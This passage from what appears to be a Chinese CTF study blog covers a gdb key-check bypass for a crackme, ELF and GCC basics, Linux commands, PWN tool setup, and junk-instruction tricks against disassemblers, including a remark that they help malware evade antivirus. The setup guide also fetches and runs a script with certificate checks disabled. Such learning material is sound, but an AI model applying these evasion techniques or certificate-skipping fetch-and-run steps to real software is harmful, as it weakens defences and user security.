alt="攻防世界-simple-check-100 7.png"></p></li><li><p>程序输出的 flag 是乱码，为：<code>潇g??礰Dn:,=瀋?h肀t</code></p></li><li><p>这里其实是 Windows 平台下的程序有问题，在 <code>key_data</code> 赋值那一段是错误的，导致绕过 <code>check_key</code> 之后也得不到正确的结果，换成 elf 文件来看才是正确的</p></li><li><p>尝试在 linux 下进行调试<br>将 64 位 elf 程序拖入 Kali，执行语句：<code>gdb task9_x86_64_46d01fe312d35ecf69c4ff8ab8ace75d080891dc</code> 进行调试<br><img src="https://s2.loli.net/2023/03/18/wngZQyLlIO716Cr.png" alt="攻防世界-simple-check-100 8.png"></p></li><li><p>输入 b main 在 main 函数的位置下断点，输入 r 执行程序<br><img src="https://s2.loli.net/2023/03/18/HNqWEf8GQDac6bM.png" alt="攻防世界-simple-check-100 9.png"></p></li><li><p>权限不够，发现文件没有执行权限，通过 chmod 增加执行权限，继续 r<br><img src="https://s2.loli.net/2023/03/18/cwjYEz5CTSpV1lg.png" alt="攻防世界-simple-check-100 10.png"><img src="https://s2.loli.net/2023/03/18/yLBAhxWr14StfRl.png" alt="攻防世界-simple-check-100 11.png"></p></li><li><p>输入 n 单步执行，一直单步执行，到达输入 key 的地方，随便输入一个 key 值，继续<br><img src="https://s2.loli.net/2023/03/18/b5f6iZdj9hPJteX.png" alt="攻防世界-simple-check-100 12.png"></p></li><li><p>接下来继续单步执行 直到判断语句 <code>test eax,eax</code> 处，查看 eax 寄存器的值：<code>i r eax</code></p></li><li><p>把 <code>test eax,eax</code> 改为真就行，发现 eax 寄存器的值为 0，修改 eax 寄存器的值为 1，指令：<code>set $eax=1</code><br><img src="https://s2.loli.net/2023/03/18/UK3Rh1T5bHgPiEv.png" alt="攻防世界-simple-check-100 13.png"></p></li><li><p>输入 c，直接执行到程序结束<br><img src="https://s2.loli.net/2023/03/18/gMnUvwuz38K6sEa.png" alt="攻防世界-simple-check-100 14.png"></p></li></ol><hr><h2 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h2><blockquote><p>程序输出 flag：flag_is_you_know_cracking!!!</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件</title>
      <link href="/2023/034ee8781c.html"/>
      <url>/2023/034ee8781c.html</url>
      
        <content type="html"><![CDATA[<h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><ul><li>可执行、可链接格式</li></ul><hr><h2 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h2><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><ul><li>经过链接的、可执行的文件，也叫程序</li></ul><h3 id="可重定位文件"><a href="#可重定位文件" class="headerlink" title="可重定位文件"></a>可重定位文件</h3><ul><li>由源文件编译而成尚未链接的目标文件，通常以“.o”为扩展名</li></ul><h3 id="共享目标文件"><a href="#共享目标文件" class="headerlink" title="共享目标文件"></a>共享目标文件</h3><ul><li>动态链接库文件，在链接过程中与其他动态链接库或可重定位文件一起构建新的目标文件，或在文件加载时连接到进程中作为运行代码的一部分</li></ul><blockquote><p>核心转储文件作为进程意外终止时进程地址空间的转储，也是 ELF 文件的一种</p></blockquote><hr><h2 id="ELF文件的结构"><a href="#ELF文件的结构" class="headerlink" title="ELF文件的结构"></a>ELF文件的结构</h2><ul><li>从链接视角来看，通过 <em><strong>节(Section)</strong></em> 来进行划分</li><li>从运行视角来看，通过 <em><strong>段(Segment)</strong></em> 来进行划分</li></ul><p><img src="https://s2.loli.net/2023/03/19/fXvBAaGZ2dnOmYC.png" alt="Linux基础_ELF文件1.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GCC编译过程</title>
      <link href="/2023/03db42fdd.html"/>
      <url>/2023/03db42fdd.html</url>
      
        <content type="html"><![CDATA[<h2 id="GCC-编译主要包括四个阶段"><a href="#GCC-编译主要包括四个阶段" class="headerlink" title="GCC 编译主要包括四个阶段"></a>GCC 编译主要包括四个阶段</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><ul><li>主要是处理源代码中以 <code>&quot;#&quot;</code> 开头的预处理指令，比如 <code>#include</code>、<code>#define</code> 等，将其置换后直接插入程序文本中，得到另一个 C 程序，通常以 <code>.i</code> 作为扩展名<ol><li>递归处理 <code>#include</code> 预处理指令，将对应文件的内容复制到该指令的位置</li><li>删除所有的 <code>#define</code> 指令，并在其被引用的位置递归地展开所有的宏</li><li>处理所有的条件预处理指令，如：<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code> 等</li><li>删除所有的注释</li><li>添加行号和文件名标识</li></ol></li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><ul><li>将预处理文件进行一系列的词法分析、语法分析、语义分析以及优化，最终生成汇编代码，通常以 <code>.s</code> 作为扩展名</li><li>GCC 默认使用 <code>AT&amp;T</code> 格式的汇编语言，添加编译选项 <code>-masm = intel</code> 可以指定为 <code>intel</code> 格式</li><li>编译选项 <code>-fno-asynchronous-unwind-tables</code> 用于生成没有 cfi 宏的汇编指令，提高可读性</li><li>若 <code>printf()</code> 只有单一参数，GCC 的优化策略会将其替换成 <code>puts()</code> 以提高性能</li></ul><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><ul><li>汇编器根据汇编指令与机器指令对照表进行翻译，通常以 <code>.o</code> 作为扩展名</li><li>此时的 <code>.o</code> 文件是一个可重定位文件，可以使用 <code>objdump -sd &lt;文件名.o&gt; -M intel</code> 查看其内容</li><li>由于此时还未进行链接，文件符号中的虚拟地址无法确定</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul><li>GCC 默认为动态链接（添加编译选项 <code>- static</code> 可指定使用静态编译）</li><li>将目标文件及其依赖库进行链接，生成可执行文件。包括：地址和空间分配、符号绑定、重定位等</li><li>链接操作由链接器（ld.so）完成，然后就会得到一个可执行文件，其包含了大量的库文件</li><li>链接完成后，上一步无法确定的虚拟地址就被修正为实际的符号地址，可以被加载到内存中正常执行</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下的操作命令</title>
      <link href="/2023/03945855ac.html"/>
      <url>/2023/03945855ac.html</url>
      
        <content type="html"><![CDATA[<h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><blockquote><p>一个点（<code>./</code>），代表本级目录<br>两个点（<code>../</code>），代表上级目录</p></blockquote><hr><h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><blockquote><p><code>cat &lt;文件名&gt; </code></p></blockquote><hr><h2 id="转到盘符-x2F-目录"><a href="#转到盘符-x2F-目录" class="headerlink" title="转到盘符&#x2F;目录"></a>转到盘符&#x2F;目录</h2><blockquote><p><code>cd E:</code><br><code>cd &lt;路径名&gt;</code></p></blockquote><hr><h2 id="显示目录中的文件"><a href="#显示目录中的文件" class="headerlink" title="显示目录中的文件"></a>显示目录中的文件</h2><blockquote><p><code>ls &lt;目录名&gt;</code>（仅显示可见文件）<br><code>ls -a</code>（显示所有文件，包括隐藏文件）<br><code>ll</code>（显示详细信息）</p></blockquote><hr><h2 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h2><blockquote><p><code>mv &lt;文件名1&gt; &lt;文件名2&gt;</code></p><p>1.文件被命名为 <code>.</code> 开头时，如 <code>.flag</code>，则 <code>flag</code> 为隐藏文件，<code>ls</code> 无法查看，需用 <code>ls -a</code> 才可以看到<br>2.将隐藏文件重命名去掉开头的 <code>.</code> 时，文件恢复可见</p></blockquote><hr><h2 id="编辑文档"><a href="#编辑文档" class="headerlink" title="编辑文档"></a>编辑文档</h2><blockquote><p><code>vim &lt;文件名&gt;</code><br><code>i</code>（进入编辑模式）<br><code>esc</code>（退出编辑模式）<br><code>:q</code>（退出，但不保存）<br><code>:wq</code>（保存并退出）<br><code>esc</code> <code>u</code>（撤销之前的操作）</p></blockquote><hr><h2 id="给文件增加可执行权限"><a href="#给文件增加可执行权限" class="headerlink" title="给文件增加可执行权限"></a>给文件增加可执行权限</h2><blockquote><p><code>chmod a+x &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-elf-可执行文件"><a href="#运行-elf-可执行文件" class="headerlink" title="运行 elf 可执行文件"></a>运行 elf 可执行文件</h2><blockquote><p><code>./ &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-python-程序"><a href="#运行-python-程序" class="headerlink" title="运行 python 程序"></a>运行 python 程序</h2><blockquote><p><code>python3 &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-C-代码"><a href="#运行-C-代码" class="headerlink" title="运行 C 代码"></a>运行 C 代码</h2><blockquote><p><code>gcc &lt;.c文件名&gt; -o &lt;编译生成的文件名&gt;</code><br><code>./&lt;编译生成的文件名&gt;</code></p></blockquote><hr><h2 id="复制-文件-x2F-文件夹"><a href="#复制-文件-x2F-文件夹" class="headerlink" title="复制 文件&#x2F;文件夹"></a>复制 文件&#x2F;文件夹</h2><blockquote><p><code>cp &lt;源文件/源文件夹 路径&gt; &lt;复制到 文件/文件夹&gt;</code></p></blockquote><hr><h2 id="移动、重命名-文件-x2F-文件夹"><a href="#移动、重命名-文件-x2F-文件夹" class="headerlink" title="移动、重命名 文件&#x2F;文件夹"></a>移动、重命名 文件&#x2F;文件夹</h2><blockquote><p><code>mv &lt;源文件/源文件夹 路径&gt; &lt;移动后的 文件/文件夹 路径&gt;</code><br><code>mv &lt;源文件名&gt; &lt;修改后的文件名&gt;</code></p></blockquote><hr><h2 id="卸载软件"><a href="#卸载软件" class="headerlink" title="卸载软件"></a>卸载软件</h2><blockquote><p>1.<code>--purge</code> 是可选项，这个属性是将软件及其配置文件一并删除<br><code>sudo apt-get --purge remove &lt;包名&gt;</code><br>2.如果不需要删除配置文件，则不加 <code>--purge</code> 选项<br><code>sudo apt-get remove &lt;包名&gt;</code></p></blockquote><hr><h2 id="删除文件-x2F-文件夹"><a href="#删除文件-x2F-文件夹" class="headerlink" title="删除文件&#x2F;文件夹"></a>删除文件&#x2F;文件夹</h2><blockquote><p><code>rm -d &lt;目录名&gt;</code>（删除一个空目录）<br><code>rm -r &lt;目录名&gt;</code>（删除一个非空目录）<br><code>rm 文件名</code>（删除文件）</p></blockquote><hr><h2 id="安装-deb-文件包"><a href="#安装-deb-文件包" class="headerlink" title="安装 .deb 文件包"></a>安装 .deb 文件包</h2><blockquote><p><code>sudo dpkg -i &lt;.deb 文件名&gt;</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下PWN环境配置</title>
      <link href="/2023/03efa885fa.html"/>
      <url>/2023/03efa885fa.html</url>
      
        <content type="html"><![CDATA[<h2 id="更换镜像源"><a href="#更换镜像源" class="headerlink" title="更换镜像源"></a>更换镜像源</h2><blockquote><p>Linux 自带的源来自国外，有时候下载速度感人，十分难受，建议换成清华镜像</p></blockquote><h3 id="Ubuntu-22-04"><a href="#Ubuntu-22-04" class="headerlink" title="Ubuntu 22.04"></a>Ubuntu 22.04</h3><blockquote><p>注意看好版本，这是 22.04 版的 Ubuntu，其他版本在 sources.list 下加入的内容可能会不一样</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt <span class="token comment"># 进入apt目录下</span><span class="token function">vim</span> sources.list <span class="token comment"># 编辑sources.list文件</span><span class="token comment"># 加入下面两个----之间的内容（就当你会用vim了）</span>-----------------------------------------------------------------<span class="token comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><span class="token comment"># 预发布软件源，不建议启用</span><span class="token comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span>----------------------------------------------------------------- <span class="token comment"># 刷新三连</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade<span class="token function">sudo</span> <span class="token function">apt-get</span> clean</code></pre><hr><h3 id="Kali-2022-4"><a href="#Kali-2022-4" class="headerlink" title="Kali 2022.4"></a>Kali 2022.4</h3><blockquote><p>注意看好版本，这是 2022.4 版的 Kali，其他版本在 sources.list 下加入的内容可能会不一样</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt <span class="token comment"># 进入apt目录下</span><span class="token function">vim</span> sources.list <span class="token comment"># 编辑sources.list文件</span><span class="token comment"># 加入下面两个----之间的内容（就当你会用vim了）</span>-----------------------------------------------------------------deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free-----------------------------------------------------------------<span class="token comment"># 刷新三联</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade<span class="token function">sudo</span> <span class="token function">apt-get</span> clean</code></pre><hr><h2 id="Python-配置"><a href="#Python-配置" class="headerlink" title="Python 配置"></a>Python 配置</h2><h3 id="安装-pip"><a href="#安装-pip" class="headerlink" title="安装 pip"></a>安装 pip</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://bootstrap.pypa.io/get-pip.py  --no-check-certificatepython get-pip.py</code></pre><hr><h3 id="修改默认-python-版本"><a href="#修改默认-python-版本" class="headerlink" title="修改默认 python 版本"></a>修改默认 python 版本</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/python<span class="token comment"># 例如我修改为python3.10</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/bin/python3.10 /usr/bin/python</code></pre><hr><h2 id="更换-pip-源"><a href="#更换-pip-源" class="headerlink" title="更换 pip 源"></a>更换 pip 源</h2><blockquote><p>更换完下载源，该更换 pip 源了，在 Windows 下用 pip 安装过 python 库的都懂，这玩意不换没法用啊</p></blockquote><ul><li>在命令行直接更改，打开终端：</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">pip config <span class="token builtin class-name">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</code></pre><hr><h2 id="CTF-配置"><a href="#CTF-配置" class="headerlink" title="CTF 配置"></a>CTF 配置</h2><blockquote><p>好了回归正题，可以开始安装 CTF 所需要的环境了</p></blockquote><h3 id="安装-32位-库"><a href="#安装-32位-库" class="headerlink" title="安装 32位 库"></a>安装 32位 库</h3><blockquote><p>不安装别想运行 32位 的 ELF 可执行文件</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libc6-dev-i386<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> lib32z1</code></pre><hr><h3 id="安装-Capstone"><a href="#安装-Capstone" class="headerlink" title="安装 Capstone"></a>安装 Capstone</h3><blockquote><p>一个轻量级的多平台架构支持的反汇编架构</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/aquynh/capstone<span class="token builtin class-name">cd</span> capstone<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span></code></pre><hr><h3 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h3><blockquote><p>通过 pip 安装或通过 git 安装，两种方法都可以，选其一即可</p></blockquote><ul><li>通过 python 的 pip 安装</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-pippip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwntools</code></pre><ul><li>通过 git 安装</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Gallopsled/pwntools<span class="token builtin class-name">cd</span> pwntools<span class="token function">sudo</span> python setup.py <span class="token function">install</span></code></pre><ul><li>验证安装</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">python <span class="token comment"># 打开python</span><span class="token comment"># 输入下面的代码，Ⅰ或Ⅱ选其一即可</span>-------------------------------------------<span class="token comment"># Ⅰ</span><span class="token function">import</span> pwnpwn.asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># Ⅱ</span>from pwn <span class="token function">import</span> *asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># 如果输出的是这个，那就是安装成功了</span>输出：<span class="token string">'1\xc0'</span>-------------------------------------------</code></pre><hr><h3 id="安装-LibcSearcher"><a href="#安装-LibcSearcher" class="headerlink" title="安装 LibcSearcher"></a>安装 LibcSearcher</h3><blockquote><p>在做栈溢出相关的题时，经常会遇到构造 ROP 链的情况。若我们在 IDA 反编译之后没有看到 system 函数，栈题大概率需要泄漏 libc 库中的函数。此时，LibcSearcher 就是最好的选择，可以用它找到偏移地址</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/lieanu/LibcSearcher.git<span class="token builtin class-name">cd</span> LibcSearcher<span class="token function">sudo</span> python setup.py develop</code></pre><hr><h3 id="安装-ROPgadget"><a href="#安装-ROPgadget" class="headerlink" title="安装 ROPgadget"></a>安装 ROPgadget</h3><blockquote><p>用来找 gadget 的，这个安装 pwntools 时自带，如果没有的话可以再手动安装</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/JonathanSalwan/ROPgadget.git<span class="token builtin class-name">cd</span> ROPgadget<span class="token function">sudo</span> python setup.py <span class="token function">install</span></code></pre><hr><h3 id="安装-one-gadget"><a href="#安装-one-gadget" class="headerlink" title="安装 one_gadget"></a>安装 one_gadget</h3><blockquote><p>one_gadget 可以用来动态查找执行 libc 动态库中的 system 执行函数，可以一步到位。在做相关堆题时尤为有效<br>用来寻找 libc 库中的 <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code> 可以一个 gadget 就可以 getshell，需要注意 one_gadget 相关限制条件</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby<span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget</code></pre><hr><h3 id="安装-glibc-all-in-one"><a href="#安装-glibc-all-in-one" class="headerlink" title="安装 glibc-all-in-one"></a>安装 glibc-all-in-one</h3><blockquote><p>在做堆题时，经常遇到不同版本的 libc，这时 glibc-all-in-one 可以很好的派上用场，动态更改 elf 文件 libc 版本</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git<span class="token builtin class-name">cd</span> glibc-all-in-one./update_list<span class="token function">cat</span> list./download <span class="token operator">&lt;</span>需要的 libc 版本<span class="token operator">></span>（例如：2.31-0ubuntu9_amd64）</code></pre><hr><h3 id="安装-qemu"><a href="#安装-qemu" class="headerlink" title="安装 qemu"></a>安装 qemu</h3><blockquote><p>这是 arm 的 pwn 环境，前期可以不安装，但是终究是逃不过的，建议一步到位</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system qemu-user-static binfmt-support<span class="token comment">## 安装依赖库</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> gcc-arm-linux-gnueabi<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt <span class="token function">git</span></code></pre><hr><h3 id="安装-Zsteg"><a href="#安装-Zsteg" class="headerlink" title="安装 Zsteg"></a>安装 Zsteg</h3><blockquote><p>做 MISC 需要，图像隐写神器</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg</code></pre><hr><h3 id="安装-Basecrack"><a href="#安装-Basecrack" class="headerlink" title="安装 Basecrack"></a>安装 Basecrack</h3><blockquote><p>做 REVERSE、MISC 需要，Base 系列编码分析工具</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/mufeedvh/basecrack.git<span class="token builtin class-name">cd</span> basecrackpip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txtpython basecrack.py</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令</title>
      <link href="/2023/039ffaa92b.html"/>
      <url>/2023/039ffaa92b.html</url>
      
        <content type="html"><![CDATA[<h2 id="花指令的原理（代码与数据混合）"><a href="#花指令的原理（代码与数据混合）" class="headerlink" title="花指令的原理（代码与数据混合）"></a>花指令的原理（代码与数据混合）</h2><blockquote><p>花指令实质就是一串垃圾指令，它与程序本身的功能无关，并不影响程序本身的逻辑</p><p>在软件保护中，花指令被作为一种手段来增加静态分析的难度，花指令也可以被用在病毒或木马上，通过加入花指令改变程序的特征码，躲避杀软的扫描，从而达到免杀的目的</p></blockquote><blockquote><p><em><strong>花指令是对抗反汇编的有效手段之一。目的是干扰 IDA 和 OD 等软件对程序的静态分析，使这些软件无法正常反汇编出原始代码</strong></em></p><p><strong>花指令分为两类：可执行的花指令、不可执行的花指令</strong></p></blockquote><hr><h3 id="常用的两类反汇编算法"><a href="#常用的两类反汇编算法" class="headerlink" title="常用的两类反汇编算法"></a>常用的两类反汇编算法</h3><ol><li><p><mark>线性扫描算法</mark> —— <em>逐行反汇编（无法将数据和内容进行区分）</em></p><ul><li><u>将遇到的每一条指令都解析成汇编指令</u>。没有对反汇编的内容进行判断，因而无法正确区分代码和数据，一些数据也会被当成代码来解码</li><li>例如：简单的花指令 <code>0xE8</code> 是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析<br><img src="https://s2.loli.net/2023/03/17/PK2fIRkFxwsCUJS.png" alt="CTF - Reverse_花指令1.png"></li></ul></li><li><p><mark>递归行进算法</mark> —— <em>按照代码可能的执行顺序进行反汇编</em></p><ul><li><u>按照代码可能的执行顺序来反汇编程序</u>。对每条可能的路径进行扫描，当解码出分支指令后，反汇编工具就将这个分支指令的地址记录下来，并分别反汇编各个分支中的指令，可以避免将代码中的数据作为指令来解码</li><li>例如：两个 <code>jz</code> 、<code>jnz</code> 跳转，一个指向无效数据，一个指向正常数据来干扰递归扫描算法<br><img src="https://s2.loli.net/2023/03/17/Eq8kMvyJNIX7H5e.png" alt="CTF - Reverse_花指令2.png"></li></ul></li></ol><hr><h3 id="IDA-中的花指令"><a href="#IDA-中的花指令" class="headerlink" title="IDA 中的花指令"></a>IDA 中的花指令</h3><p><img src="https://s2.loli.net/2023/03/17/hKwl3Sd5Mmv6ojt.png" alt="CTF - Reverse_花指令3.png"></p><hr><h2 id="可执行的花指令"><a href="#可执行的花指令" class="headerlink" title="可执行的花指令"></a>可执行的花指令</h2><blockquote><p>能够正常运行但又不改变原始程序逻辑性的一组无用指令，它们运行完后不会改变原来程序的堆栈、寄存器，但能起到干扰静态分析的作用</p><p>这类花指令有如下特点：</p><ol><li>可以正常运行</li><li>不改变任何寄存器的值</li><li>反汇编器可以正确反汇编该指令</li></ol><p>一般分两种：</p><ol><li>改变堆栈操作</li><li>利用 <code>call 指令</code> 或 <code>jmp 指令</code> 增加执行流程的复杂度【<code>call</code> 指令的硬指令为 0E8h，<mark>E8 表示执行，90 表示跳过</mark>】</li></ol></blockquote><ul><li><strong>示例：</strong><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>push eax<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>在 32位 下，<code>push eax</code> 分为两个步骤：<pre class="language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span>     <span class="token comment">// 修改堆栈指针 ESP (压入时自动减 4)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>eax<span class="token punctuation">)</span>     <span class="token comment">// 将指定的操作数送入新的栈顶位置</span></code></pre><strong>正常情况下，push 操作需要对应一个 pop 操作来保持堆栈的平衡</strong><br>在 32位 下，<code>pop eax</code> 分为两个步骤：<pre class="language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span>eax<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">// 将栈顶位置送入指定的操作数</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span>     <span class="token comment">// 修改堆栈指针 ESP (退出时自动加 4)</span></code></pre><strong>后面跟着的 <code>add esp, 4</code> 起到了 pop 指令的部分功能，也就是恢复了堆栈的平衡，使得程序能够正常运行<br>但在 IDA 中却无法正常识别这种操作，所以 IDA 进行解析时会认为该函数堆栈不平衡，从而使F5功能失效</strong><br><img src="https://s2.loli.net/2023/03/17/p2tLg6oSuRHNDPc.png" alt="CTF - Reverse_花指令4.png"></li></ul><hr><h2 id="不可执行的花指令"><a href="#不可执行的花指令" class="headerlink" title="不可执行的花指令"></a>不可执行的花指令</h2><blockquote><p>花指令虽然被插入到了正常代码的中间，但是并不意味着它一定会得到执行。</p><p>这类不可执行的花指令通常形式为：<mark>在代码中出现了类似数据的代码，或者 IDA 反汇编后为 JUMPOUT(xxxxx)</mark></p><p>这类花指令一般不属于 CPU 可识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序的正常运行</p></blockquote><ul><li><p><strong>示例 1：</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>xor eax<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>jz s<span class="token punctuation">;</span>_emit <span class="token number">0x11</span><span class="token punctuation">;</span>   <span class="token comment">// _emit 指令为：插入字节码</span>_emit <span class="token number">0x22</span><span class="token punctuation">;</span>_emit <span class="token number">0x33</span><span class="token punctuation">;</span>   <span class="token comment">// 0x33是 xor 指令的操作码，会导致后面正常的 Push 指令被错误解析</span>s<span class="token operator">:</span><span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>由于经过 <code>xor eax, eax</code> 后，ZF 标志位被置为 1，那么 jz 这条跳转指令必定会被执行，后面插入的 <code>0x11</code>，<code>0x22</code>，<code>0x33</code> 就会被跳过，程序正常输出： 